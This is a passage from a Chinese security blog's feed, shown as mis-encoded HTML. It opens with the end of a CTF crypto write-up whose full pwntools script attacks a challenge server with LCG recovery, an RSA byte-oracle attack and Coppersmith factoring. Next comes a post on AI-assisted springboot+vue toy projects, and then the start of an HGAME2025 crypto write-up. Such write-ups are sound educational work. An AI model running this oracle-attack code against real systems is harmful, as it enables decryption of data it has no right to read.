href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle">RSA é€‰æ‹©æ˜å¯†æ–‡æ”»å‡» - CTF Wiki</a>ã€‚</p><p>ä¹‹åæ˜¾ç„¶åªæœ‰75è½®æ˜¯ä¸å¤Ÿçš„ï¼Œæœ€å¤šä¹Ÿæ˜¯åªèƒ½å¾—åˆ°75*8=600ä½çš„pï¼Œæœ€åæ‰“ä¸€ä¸ªé«˜ä½æ”»å‡»å°±å¥½äº†ã€‚ä¸»è¦å°±æ˜¯å¯ä»¥å…ˆè‡ªå·±è¿è¡Œ127è½®ï¼Œå°†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn><msup><mn>6</mn><mn>127</mn></msup><mi>p</mi></mrow><annotation encoding="application/x-tex">256^{127}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span>æ„é€ åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">r_2.N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>è¿™ä¸ªæ•°é‡çº§ä¸Šï¼ˆåº”è¯¥æ˜¯å¯ä»¥ç›´æ¥è®¾ç½®ä¸Šé™äº†ï¼Œæˆ‘æ‡’å¾—æ€è€ƒäº†ï¼‰ï¼Œç„¶åå†è·ŸæœåŠ¡å™¨äº¤äº’ã€‚</p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> decimal<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh=remote(<span class="hljs-string">&quot;39.106.16.204&quot;</span>,<span class="hljs-number">13620</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Option &gt; &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;flag: &#x27;</span>)<br>ciphertext=bytes_to_long(<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode()))<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hint1: &#x27;</span>)<br>Hint1=<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode())<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hint2: &#x27;</span>)<br>Hint2=<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode())<br><br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Option &gt; &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><br>s=[]<br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1280</span>,<span class="hljs-number">16</span>):<br>    sh.recvuntil(<span class="hljs-string">b&#x27;(y/[n])?&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>    s.append(<span class="hljs-built_in">int</span>(sh.recvline().strip().decode()))<br>    <br>s=[<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s[i:i+<span class="hljs-number">16</span>]]),<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">80</span>,<span class="hljs-number">16</span>)]<br><br>length=<span class="hljs-built_in">len</span>(s)<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>    t.append(s[i]-s[i-<span class="hljs-number">1</span>])<br>all_n = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length-<span class="hljs-number">3</span>):<br>    all_n.append(gcd((t[i+<span class="hljs-number">1</span>]*t[i-<span class="hljs-number">1</span>]-t[i]*t[i]), (t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]*t[i+<span class="hljs-number">1</span>])))<br><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> all_n:<br>    n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">abs</span>(n))<br>    <span class="hljs-keyword">if</span> n.bit_length()&lt;<span class="hljs-number">1024</span> <span class="hljs-keyword">and</span> isPrime(n):<br>        <span class="hljs-keyword">continue</span><br>    a=(s[<span class="hljs-number">2</span>]-s[<span class="hljs-number">1</span>])*invert((s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>]),n)%n<br>    ani=invert(a,n)<br>    b=(s[<span class="hljs-number">1</span>]-a*s[<span class="hljs-number">0</span>])%n<br><br>    <span class="hljs-comment">#è¿™é‡Œå¯èƒ½æ‰¾ä¸åˆ°æ­£ç¡®çš„LCGçš„p</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find p&quot;</span>)<br><br>    seed=s[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        seed=<span class="hljs-built_in">int</span>((seed-b)*inverse(a,n) % n)<br>        <span class="hljs-keyword">if</span> seed.bit_length()&lt;=<span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">break</span><br>    seed=long_to_bytes(seed)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(seed)<br>    <br>    <span class="hljs-comment">#è¿™é‡Œä¸å¯¹è¿˜æ˜¯å› ä¸ºä¸Šé¢pæ‰¾ä¸å¯¹</span><br>    r1n=bytes_to_long(AES.new(seed,AES.MODE_ECB).decrypt(Hint2))<br>    <br><br>    sh.recvuntil(<span class="hljs-string">b&#x27;(y/[n])?&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>    sh.recvuntil(<span class="hljs-string">b&#x27;Option &gt; &#x27;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br>    sh.recvuntil(<span class="hljs-string">b&#x27;Your pubkey:(&#x27;</span>)<br>    r2n=<span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>).strip().decode()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    r2e=<span class="hljs-built_in">int</span>(sh.recvline().strip().decode()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><br>    <span class="hljs-comment"># https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle</span><br>    c=<span class="hljs-built_in">int</span>.from_bytes(Hint1,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <br>    decimal.getcontext().prec = <span class="hljs-built_in">int</span>(<span class="hljs-number">2048</span>)<br>    L = decimal.Decimal(<span class="hljs-built_in">int</span>(<span class="hljs-number">0</span>))<br>    R = decimal.Decimal(<span class="hljs-built_in">int</span>(r2n))<br><br>    <span class="hljs-comment">#è‡ªæµ‹</span><br>    <span class="hljs-comment">#127*8=1016 å·®ä¸å¤šå°†r1.pä¹˜åˆ°è·Ÿr2.Nä¸€ä¸ªæ•°é‡çº§äº†</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>        c = (c * <span class="hljs-built_in">pow</span>(<span class="hljs-number">256</span>, r2e, r2n)) % r2n<br><br>        interval=(R-L)/<span class="hljs-built_in">int</span>(<span class="hljs-number">256</span>)<br>        L=L+interval*<span class="hljs-built_in">int</span>(<span class="hljs-number">0</span>)<br>        R=L+interval<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">75</span>):<br>        sh.recvuntil(<span class="hljs-string">b&#x27;(y/[n])?&#x27;</span>)<br>        sh.sendline(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>        c = <span class="hljs-built_in">int</span>((c * <span class="hljs-built_in">pow</span>(<span class="hljs-number">256</span>, r2e, r2n)) % r2n)<br><br>        sh.recvuntil(<span class="hljs-string">b&#x27;(in hex):&#x27;</span>)<br>        <span class="hljs-comment">#è¿™é‡Œä¸zfillæœåŠ¡å™¨ä¼šæŠ¥é”™</span><br>        sh.sendline(<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">512</span>).encode())<br><br>        sh.recvuntil(<span class="hljs-string">b&#x27;Result: &#x27;</span>)<br>        x=<span class="hljs-built_in">bytes</span>.fromhex(sh.recvline().strip().decode())<br>        res=<span class="hljs-built_in">int</span>.from_bytes(x,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        res=<span class="hljs-built_in">int</span>(res%<span class="hljs-number">256</span>)<br><br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(-j*r2n%<span class="hljs-number">256</span>)==res:<br>                interval=(R-L)/<span class="hljs-built_in">int</span>(<span class="hljs-number">256</span>)<br>                L=L+interval*j<br>                R=L+interval<br><br><br>    high_p=(<span class="hljs-built_in">int</span>(R)&gt;&gt;<span class="hljs-number">440</span>)&lt;&lt;<span class="hljs-number">440</span><br><br>    PR.&lt;x&gt; = PolynomialRing(Zmod(r1n))<br>    f = high_p + x<br>    x = f.small_roots(X = <span class="hljs-number">2</span>^<span class="hljs-number">440</span>,beta = <span class="hljs-number">0.4</span>)<br>    p=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br><br>    q=<span class="hljs-built_in">int</span>(r1n//p)<br><br>    e=<span class="hljs-number">65537</span><br>    d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(ciphertext),<span class="hljs-built_in">int</span>(d),<span class="hljs-built_in">int</span>(r1n)))))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AIå°é¡¹ç›®ä¹‹springboot+vue</title>
    <link href="/2025/03/19/springbootvue/"/>
    <url>/2025/03/19/springbootvue/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/naby1/springboot_vue">https://github.com/naby1/springboot_vue</a></p></blockquote><p>ç”±äºå®¢è§‚åŸå› ï¼Œå°è¯•0åŸºç¡€æ¥è§¦springboot+vue</p><p>åœ¨Aiçš„å¸®åŠ©ä¸‹ï¼ˆæŒ‡99%çš„ä»£ç ï¼Œä½¿ç”¨çš„æ˜¯å…ƒå®çš„deepseekæ·±åº¦æ€è€ƒï¼Œæ— è”ç½‘ï¼‰ï¼Œå†™äº†ä¸¤ä¸ªå°é¡¹ç›®ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><h1 id="æ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#æ–‡ä»¶ç³»ç»Ÿ"></a> æ–‡ä»¶ç³»ç»Ÿ</h1><p>ï¼ˆç”±äºæœ¬äººæŠ€æœ¯å¤ªå·®ï¼ŒåŸºæœ¬éƒ½æ˜¯å†™åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå‹¿å–·ï¼‰</p><p>å®ç°äº†ç®€å•çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ ¹ç›®å½•é…ç½®åœ¨java/src/main/java/org.example/controller/FileController.javaç¬¬31è¡Œçš„BASE_PATHä¸­<br /><img src="/imgs/springbootvue/file/1.png" alt="" /></p><p>å®ç°åŠŸèƒ½ï¼š</p><ol><li><p>å·¦ä¸Šè§’æ˜¾ç¤ºå½“å‰ç›®å½•è·¯å¾„ï¼ŒAIçš„è¯´æ³•æ˜¯é¢åŒ…å±‘å¯¼èˆªã€‚</p></li><li><p>å³ä¸Šè§’æœ‰æ–°å»ºæ–‡ä»¶å¤¹å’Œä¸Šä¼ åŠŸèƒ½ï¼Œä¸Šä¼ æŒ‰é’®å·¦ä¾§ç‚¹å‡»æ˜¯å¯ä»¥ç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œå³ä¾§æŒ‰é’®å¯ä»¥é€‰æ‹©ä¸Šä¼ æ–‡ä»¶å¤¹å’Œä¸Šä¼ æ–‡ä»¶ã€‚åœ¨è®¾è®¡æ—¶æ–°å»ºæ–‡ä»¶å¤¹åŠŸèƒ½ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ï¼Œå‘½åä¸ºâ€œæ–°å»ºæ–‡ä»¶å¤¹â€ï¼Œå¹¶ä¸”ç”±äºä¸å¯é‡åé—®é¢˜ï¼Œæ— æ³•åœ¨æ–°å»ºæ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥ç®—æ˜¯bugå§ï¼Œä½†æˆ‘æ‡’å¾—æ”¹äº†ã€‚<br /><img src="/imgs/springbootvue/file/2.png" alt="2" /></p></li><li><p>ä¸‹æ–¹æœ¬ä½“å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶çš„è¡¨ï¼Œæœ‰åç§°ï¼Œå¤§å°ï¼ˆæ–‡ä»¶æ‰æœ‰ï¼‰ï¼Œä¿®æ”¹æ—¶é—´ï¼Œéƒ½æœ‰æ’åºåŠŸèƒ½ï¼ˆè‡ªå¸¦çš„sortableï¼‰</p></li><li><p>å¯¹äºä¸‹æ–¹æ–‡ä»¶è¡¨ä¸­æ¯ä¸€æ æ–‡ä»¶/ç›®å½•ï¼ŒåŒå‡»å¯ä»¥è¿›å…¥ç›®å½•ï¼ˆä¿®æ”¹å½“å‰è®¿é—®è·¯å¾„å¹¶å‘åç«¯è¯·æ±‚æ‰€åœ¨ç›®å½•æ–‡ä»¶ï¼‰ã€‚å³é”®ä¼šæœ‰èœå•æ ï¼Œå¯ä»¥è¿›è¡Œä¸‹è½½ã€é‡å‘½åå’Œåˆ é™¤æ“ä½œã€‚<br /><img src="/imgs/springbootvue/file/3.png" alt="3" /></p></li></ol><h1 id="å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ"></a> å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ</h1><p>å®ç°å‰ç«¯ã€åç«¯å’Œæ•°æ®åº“çš„åŸºæœ¬æ“ä½œï¼Œå¢åˆ æ”¹æŸ¥ç­‰åŸºç¡€åŠŸèƒ½ã€‚<br />ä¸ªäººæ„Ÿæ‚Ÿï¼šä½¿ç”¨è·¯ç”±ï¼Œåˆ†å¼€è®¾è®¡æ¯”è¾ƒæ–¹ä¾¿ç®¡ç†ã€‚<br /><img src="/imgs/springbootvue/student/1.png" alt="1" /></p><h2 id="æ•°æ®åº“è®¾è®¡"><a class="markdownIt-Anchor" href="#æ•°æ®åº“è®¾è®¡"></a> æ•°æ®åº“è®¾è®¡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user (<br>  id INT PRIMARY KEY AUTO_INCREMENT,<br>  name VARCHAR(20) NOT NULL,<br>  passwd CHAR(32) NOT NULL,<br>  birthday DATE,<br>  sex ENUM(&#x27;M&#x27;,&#x27;F&#x27;) DEFAULT &#x27;M&#x27;,<br>  phone VARCHAR(20),<br>  email VARCHAR(50),<br>  addr VARCHAR(125),<br>  education ENUM(&#x27;PHD&#x27;,&#x27;MASTER&#x27;,&#x27;BACHELOR&#x27;,&#x27;ASSOCIATE&#x27;,&#x27;HIGHSCHOOL&#x27;,&#x27;JUNIORHS&#x27;,&#x27;JUNIORHS&#x27;,&#x27;OTHER&#x27;),<br>  create_time DATETIME DEFAULT CURRENT_TIMESTAMP,<br>  last_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP<br>);<br></code></pre></td></tr></table></figure><blockquote><p>PHD - åšå£«<br />MASTER - ç¡•å£«<br />BACHELOR - æœ¬ç§‘<br />ASSOCIATE - å¤§ä¸“<br />HIGHSCHOOL - é«˜ä¸­<br />JUNIORHS - åˆä¸­<br />PRIMARY - å°å­¦<br />OTHER - å…¶ä»–</p></blockquote><p>æµ‹è¯•æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO user (name, passwd, birthday, sex, phone, email, addr, education) <br>VALUES (<br>  &#x27;å¼ ä¸‰&#x27;, <br>  MD5(&#x27;zhangsan&#x27;), <br>  &#x27;2000-01-01&#x27;, <br>  &#x27;M&#x27;, <br>  &#x27;13812345678&#x27;, <br>  &#x27;zhangsan@example.com&#x27;, <br>  &#x27;åŒ—äº¬å¸‚æœé˜³åŒº&#x27;, <br>  &#x27;BACHELOR&#x27;<br>);<br></code></pre></td></tr></table></figure><h2 id="æŸ¥è¯¢åŠŸèƒ½"><a class="markdownIt-Anchor" href="#æŸ¥è¯¢åŠŸèƒ½"></a> æŸ¥è¯¢åŠŸèƒ½</h2><p>ç‚¹å‡»åå°±ä¼šæ˜¾ç¤ºæŸ¥è¯¢åˆ°çš„æ‰€æœ‰æ•°æ®ï¼Œå¯†ç åœ¨åç«¯å°±è¿›è¡Œäº†éšè—ã€‚é»˜è®¤ä¸€é¡µæ˜¾ç¤º20æ¡æ•°æ®ï¼Œæœ€ä¸‹æ–¹å¯ä»¥é€‰æ‹©é¡µæ•°å’Œæ˜¾ç¤ºæ¡æ•°ã€‚åœ¨æœ€ä¸Šæ–¹èƒ½å¯¹å››ä¸ªå±æ€§è¿›è¡ŒæŸ¥è¯¢ï¼Œå¯å•ç‹¬æŸ¥è¯¢ä¹Ÿå¯ç»„åˆæŸ¥è¯¢ã€‚<br /><img src="/imgs/springbootvue/student/2.png" alt="2" /></p><h2 id="åˆ é™¤åŠŸèƒ½"><a class="markdownIt-Anchor" href="#åˆ é™¤åŠŸèƒ½"></a> åˆ é™¤åŠŸèƒ½</h2><p>è¾“å…¥å¾…åˆ é™¤çš„IDï¼Œç‚¹å‡»æŸ¥è¯¢ï¼Œä¼šå…ˆæ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯è¿›è¡Œç¡®è®¤ï¼Œç„¶åå†åˆ é™¤ï¼ˆåˆ é™¤ä¸€å¼€å§‹ä¸å¯ç‚¹ï¼Œå½“ç„¶è¿™åªæ˜¯å‰ç«¯è®¾ç½®ï¼‰<br /><img src="/imgs/springbootvue/student/3.png" alt="3" /></p><h2 id="æ·»åŠ åŠŸèƒ½"><a class="markdownIt-Anchor" href="#æ·»åŠ åŠŸèƒ½"></a> æ·»åŠ åŠŸèƒ½</h2><p>å°±æ˜¯ç®€å•çš„æ·»åŠ æ•°æ®ï¼Œåœ¨åç«¯ä¼šå¯¹æ·»åŠ æ•°æ®è¿›è¡Œæ ¡éªŒï¼ˆåœ¨modelå¤„ï¼‰<br /><img src="/imgs/springbootvue/student/4.png" alt="4" /></p><h2 id="ä¿®æ”¹åŠŸèƒ½"><a class="markdownIt-Anchor" href="#ä¿®æ”¹åŠŸèƒ½"></a> ä¿®æ”¹åŠŸèƒ½</h2><p>å…ˆæŸ¥è¯¢åä¿®æ”¹ï¼ŒIDã€åˆ›å»ºæ—¶é—´å’Œä¿®æ”¹æ—¶é—´ä¸å¯æ›´æ”¹ï¼Œå…¶ä»–éƒ½å¯ä»¥æ›´æ”¹ï¼ŒåŒæ ·ç”±äºmodelçš„è®¾ç½®ï¼Œä¼šå¯¹æ•°æ®è¿›è¡Œæ ¡éªŒã€‚<br /><img src="/imgs/springbootvue/student/5.png" alt="5" /></p><h1 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“"></a> æ€»ç»“</h1><p>æ„Ÿè§‰AIå†™å°åŠŸèƒ½è¿˜è¡Œï¼Œä½†æ˜¯ä¸Šä¸‹æ–‡æœ‰ç‚¹å·®ï¼Œç‰¹åˆ«æ˜¯æ ¼å¼éƒ½å¾ˆéš¾ç»Ÿä¸€ï¼Œå¯¹äºåˆ†æ–‡ä»¶ç¼–å†™æœ‰ç‚¹å›°éš¾ã€‚å†™äº†è¿™ä¸¤ä¸ªé¡¹ç›®æ„Ÿè§‰ä¸èƒ½è¯´æ²¡æœ‰æ”¶è·ï¼Œåªèƒ½è¯´æ”¶è·å¾ˆå°ï¼Œå¦‚æœåªæ˜¯è‡ªå·±éšä¾¿å½“å°ç©æ„ç”¨é‚£æ²¡å•¥è¯´çš„ï¼Œä½†å¦‚æœæƒ³è¦æ·±å…¥äº†è§£å¯¹åº”æŠ€æœ¯ï¼Œè¿˜æ˜¯ä¸å¤ªå¤Ÿï¼Œå¯¹äºçœŸæ­£çš„é¡¹ç›®ç»“æ„ã€ä»£ç è§„èŒƒå’Œä¸€äº›ç†è®ºåŸºç¡€è¿˜æ˜¯è¦é æ—¶é—´å’ŒåŠªåŠ›ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>springboot</category>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2025-Crypto</title>
    <link href="/2025/02/12/hgame2025_1/"/>
    <url>/2025/02/12/hgame2025_1/</url>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="sieve"><a class="markdownIt-Anchor" href="#sieve"></a> sieve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><br>FLAG = <span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>m = bytes_to_long(FLAG)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trick</span>(<span class="hljs-params">k</span>):<br>    <span class="hljs-keyword">if</span> k &gt; <span class="hljs-number">1</span>:<br>        mul = prod(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,k)) <br>        <span class="hljs-keyword">if</span> k - mul % k - <span class="hljs-number">1</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">65537</span><br>p = q = nextprime(trick(e^<span class="hljs-number">2</span>//<span class="hljs-number">6</span>)&lt;&lt;<span class="hljs-number">128</span>)<br>n = p * q<br>enc = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>trick</code>è®¡ç®—çš„æ˜¯å°äºkçš„æ‰€æœ‰æ•°çš„<code>æ¬§æ‹‰å‡½æ•°ä¹‹å’Œ</code>åŠ ä¸Š<code>ç´ æ•°çš„ä¸ªæ•°</code></p><p>è¿™ä¸ª<code>k - mul % k - 1 